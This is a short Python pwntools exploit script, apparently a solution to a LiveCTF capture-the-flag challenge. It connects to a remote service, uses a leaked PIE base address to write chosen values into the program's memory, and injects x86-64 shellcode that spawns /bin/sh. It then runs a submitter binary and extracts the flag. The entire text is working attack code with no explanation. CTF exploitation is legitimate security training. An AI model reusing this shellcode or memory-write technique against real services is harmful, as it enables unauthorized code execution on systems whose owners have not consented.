from pwn import *
import sys
import os

A = 0
if A:
  p = process('./challenge')
else:
  HOST = os.environ.get('HOST', 'localhost')
  PORT = 31337

  p = remote(HOST, int(PORT))

# context.log_level = 0
pie = u64(p.recv(8))
# print(hex(pie))

p.send(p64(pie + 0x45B4))
sleep(.1)
p.send(p64(0))
sleep(.1)

a = pie + 0x4330
p.send(p64(a))
sleep(.1)
p.send(p64(pie + 0x1370))
sleep(.1)
p.send(p64(a + 8))
sleep(.1)
p.send(p64(pie + 0x2000))
sleep(.1)

p.send(p64(0))
sleep(.1)

sh = b'\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05'

p.send(p32(0))
sleep(.1)

for i in range(0, len(sh)//8*8 + 8, 8):
  a = pie + 0x2140 + i
  p.send(p64(a))
  sleep(.1)
  p.send(sh[i:i+8])
  sleep(.1)

p.send(p64(0))
sleep(.1)


# p.interactive()

p.sendline(b'./submitter')
p.recv()
flag = p.recvline_contains(b'LiveCTF{').decode().strip()

log.info('Flag: %s', flag)